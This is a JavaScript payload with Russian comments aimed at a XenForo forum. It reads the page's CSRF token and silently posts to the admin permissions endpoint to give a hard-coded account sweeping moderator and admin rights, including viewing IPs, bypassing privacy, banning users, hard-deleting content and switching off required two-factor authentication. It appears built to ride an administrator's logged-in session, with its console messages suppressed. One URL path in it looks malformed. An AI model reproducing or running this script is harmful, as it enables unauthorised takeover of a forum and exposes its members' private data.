// Находим CSRF-токен
let token = document.querySelector('input[name="_xfToken"]')?.value;

if (!token) {
    //console.log('❌ Токен не найден');
} else {
    //console.log('✅ Токен найден, отправляем запрос...');
    
    // Данные пользователя (ЗАМЕНИ НА СВОИ)
    let username = 'tbilirc';  // твой username
    let userId = 20887;                           // твой ID
    
    let formData = new FormData();
    
    // Системные поля
    formData.append('_xfToken', token);
    formData.append('_xfRequestUri', '/admin.php?permissions/users/' + username + '.' + userId + '/');
    formData.append('_xfWithData', '1');
    formData.append('_xfResponseType', 'json');
    
    // ВСЕ ПРАВА ИЗ ТВОЕГО PAYLOAD
    // General
    formData.append('permissions[general][view]', 'allow');
    formData.append('permissions[general][viewNode]', 'allow');
    formData.append('permissions[general][viewMemberList]', 'allow');
    formData.append('permissions[general][viewProfile]', 'allow');
    formData.append('permissions[general][usePush]', 'allow');
    formData.append('permissions[general][maxMentionedUsers]', '-1');
    formData.append('permissions[general][search]', 'allow');
    formData.append('permissions[general][createTag]', 'allow');
    formData.append('permissions[general][bypassUserTagLimit]', 'allow');
    formData.append('permissions[avatar][allowed]', 'allow');
    formData.append('permissions[general][editProfile]', 'allow');
    formData.append('permissions[general][editCustomTitle]', 'allow');
    formData.append('permissions[general][requireTfa]', 'unset');
    formData.append('permissions[general][submitWithoutApproval]', 'allow');
    formData.append('permissions[general][bypassFloodCheck]', 'allow');
    formData.append('permissions[general][bypassSpamCheck]', 'allow');
    formData.append('permissions[general][report]', 'allow');
    formData.append('permissions[general][useContactForm]', 'allow');
    formData.append('permissions[general][viewIps]', 'allow');
    formData.append('permissions[general][bypassUserPrivacy]', 'allow');
    formData.append('permissions[general][cleanSpam]', 'allow');
    formData.append('permissions[general][viewWarning]', 'allow');
    formData.append('permissions[general][warn]', 'allow');
    formData.append('permissions[general][manageWarning]', 'allow');
    formData.append('permissions[general][editBasicProfile]', 'allow');
    formData.append('permissions[general][approveRejectUser]', 'allow');
    formData.append('permissions[general][banUser]', 'allow');
    
    // Bookmarks
    formData.append('permissions[bookmark][view]', 'allow');
    formData.append('permissions[bookmark][create]', 'allow');
    
    // Forum
    formData.append('permissions[forum][viewOthers]', 'allow');
    formData.append('permissions[forum][viewContent]', 'allow');
    formData.append('permissions[forum][react]', 'allow');
    formData.append('permissions[forum][postThread]', 'allow');
    formData.append('permissions[forum][postReply]', 'allow');
    formData.append('permissions[forum][deleteOwnPost]', 'allow');
    formData.append('permissions[forum][editOwnPost]', 'allow');
    formData.append('permissions[forum][editOwnPostTimeLimit]', '-1');
    formData.append('permissions[forum][editOwnThreadTitle]', 'allow');
    formData.append('permissions[forum][deleteOwnThread]', 'allow');
    formData.append('permissions[forum][viewAttachment]', 'allow');
    formData.append('permissions[forum][uploadAttachment]', 'allow');
    formData.append('permissions[forum][uploadVideo]', 'allow');
    formData.append('permissions[forum][tagOwnThread]', 'allow');
    formData.append('permissions[forum][tagAnyThread]', 'allow');
    formData.append('permissions[forum][manageOthersTagsOwnThread]', 'allow');
    formData.append('permissions[forum][votePoll]', 'allow');
    formData.append('permissions[forum][inlineMod]', 'allow');
    formData.append('permissions[forum][stickUnstickThread]', 'allow');
    formData.append('permissions[forum][lockUnlockThread]', 'allow');
    formData.append('permissions[forum][manageAnyThread]', 'allow');
    formData.append('permissions[forum][deleteAnyThread]', 'allow');
    formData.append('permissions[forum][hardDeleteAnyThread]', 'allow');
    formData.append('permissions[forum][threadReplyBan]', 'allow');
    formData.append('permissions[forum][editAnyPost]', 'allow');
    formData.append('permissions[forum][deleteAnyPost]', 'allow');
    formData.append('permissions[forum][hardDeleteAnyPost]', 'allow');
    formData.append('permissions[forum][warn]', 'allow');
    formData.append('permissions[forum][manageAnyTag]', 'allow');
    formData.append('permissions[forum][viewDeleted]', 'allow');
    formData.append('permissions[forum][viewModerated]', 'allow');
    formData.append('permissions[forum][undelete]', 'allow');
    formData.append('permissions[forum][approveUnapprove]', 'allow');
    
    // Conversation
    formData.append('permissions[conversation][start]', 'allow');
    formData.append('permissions[conversation][receive]', 'allow');
    formData.append('permissions[conversation][react]', 'allow');
    formData.append('permissions[conversation][uploadAttachment]', 'allow');
    formData.append('permissions[conversation][uploadVideo]', 'allow');
    formData.append('permissions[conversation][editOwnMessage]', 'allow');
    formData.append('permissions[conversation][editOwnMessageTimeLimit]', '-1');
    formData.append('permissions[conversation][maxRecipients]', '-1');
    formData.append('permissions[conversation][editAnyMessage]', 'allow');
    formData.append('permissions[conversation][alwaysInvite]', 'allow');
    
    // Signature
    formData.append('permissions[general][editSignature]', 'allow');
    formData.append('permissions[signature][basicText]', 'allow');
    formData.append('permissions[signature][extendedText]', 'allow');
    formData.append('permissions[signature][align]', 'allow');
    formData.append('permissions[signature][list]', 'allow');
    formData.append('permissions[signature][image]', 'allow');
    formData.append('permissions[signature][link]', 'allow');
    formData.append('permissions[signature][media]', 'allow');
    formData.append('permissions[signature][block]', 'allow');
    formData.append('permissions[signature][maxPrintable]', '-1');
    formData.append('permissions[signature][maxLines]', '-1');
    formData.append('permissions[signature][maxLinks]', '-1');
    formData.append('permissions[signature][maxImages]', '-1');
    formData.append('permissions[signature][maxSmilies]', '-1');
    formData.append('permissions[signature][maxTextSize]', '-1');
    
    // Profile Post
    formData.append('permissions[profilePost][view]', 'allow');
    formData.append('permissions[profilePost][react]', 'allow');
    formData.append('permissions[profilePost][manageOwn]', 'allow');
    formData.append('permissions[profilePost][post]', 'allow');
    formData.append('permissions[profilePost][comment]', 'allow');
    formData.append('permissions[profilePost][deleteOwn]', 'allow');
    formData.append('permissions[profilePost][editOwn]', 'allow');
    formData.append('permissions[profilePost][inlineMod]', 'allow');
    formData.append('permissions[profilePost][editAny]', 'allow');
    formData.append('permissions[profilePost][deleteAny]', 'allow');
    formData.append('permissions[profilePost][hardDeleteAny]', 'allow');
    formData.append('permissions[profilePost][warn]', 'allow');
    formData.append('permissions[profilePost][viewDeleted]', 'allow');
    formData.append('permissions[profilePost][viewModerated]', 'allow');
    formData.append('permissions[profilePost][undelete]', 'allow');
    formData.append('permissions[profilePost][approveUnapprove]', 'allow');
    
    // ОТПРАВЛЯЕМ ЗАПРОС
    let url = '/upload123.com/admin.php?permissions/users/' + username + '.' + userId + '/save';
    
    fetch(url, {
        method: 'POST',
        headers: {
            'X-Requested-With': 'XMLHttpRequest'
        },
        credentials: 'include',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        //console.log('Ответ сервера:', data);
        if (data.status === 'ok') {
            //console.log('✅✅✅ ПРАВА УСПЕШНО ИЗМЕНЕНЫ!');
            //alert('Права для пользователя ' + username + ' успешно изменены!');
        } else {
            //console.log('❌ Ошибка:', data.errors);
            //alert('Ошибка: ' + JSON.stringify(data.errors));
        }
    })
    .catch(error => {
        //console.error('❌ Ошибка запроса:', error);
    });
}